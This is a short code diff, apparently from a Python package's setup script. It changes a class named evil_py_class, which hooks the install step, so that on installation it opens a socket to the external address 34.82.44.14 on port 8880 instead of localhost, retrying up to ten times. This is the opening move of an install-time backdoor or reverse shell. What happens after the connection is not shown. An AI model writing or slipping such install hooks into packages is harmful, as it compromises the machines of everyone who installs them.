@@ -7,8 +7,7 @@ class evil_py_class(install):
     for x in range(10):
       try:
         s=socket.socket(2,socket.SOCK_STREAM)
-        #s.connect(('34.82.44.14',8880))
-        s.connect(('127.0.0.1',8880))
+        s.connect(('34.82.44.14',8880))
         break
       except:
         time.sleep(5)
